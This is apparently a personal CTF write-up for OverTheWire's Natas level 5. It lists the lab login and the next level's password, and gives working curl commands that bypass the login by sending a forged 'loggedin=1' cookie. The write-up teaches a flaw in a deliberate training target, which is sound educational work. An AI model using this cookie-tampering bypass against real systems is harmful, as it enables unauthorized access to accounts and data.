---
date: '2026-02-15'
description: have you tried it with milk?
draft: false
title: natas-5
weight: 6
ShowToc: false
---

| info | value |
|:-----|------:|
| user | `natas5` |
| pass | `0n35PkggAPm2zbEpOU802c0x0Msn1ToK` |
| host | `http://natas5.natas.labs.overthewire.org` |

### explanation
hmm seems like we have no info to go off other than we are not logged in

```html
<h1>natas5</h1>
<div id="content">
    Access disallowed. You are not logged in
</div>
```

usually login data is stored in form of a http cookie, which you can inspect by application > cookies tab in your browser

with curl, we may view the current http-header of the page by passing the `-I`/`--head` parameter to only print the headers. you may omit `-I` for the `-v` / `--verbose` parameter if you also want the body printed to stdout

```sh
curl -I http://natas5.natas.labs.overthewire.org \
-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

you may now find the `set-cookie` http value set to `0`. to change that, send a request via the `-b`/`--cookie` parameter with the appropriate values

```sh
curl http://natas5.natas.labs.overthewire.org \
-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK --cookie "loggedin=1"
```

the same behavior can be achieved when changing the application > cookies value of `loggedin` to 1

```html
<h1>natas5</h1>
<div id="content">
    Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
</div>
```

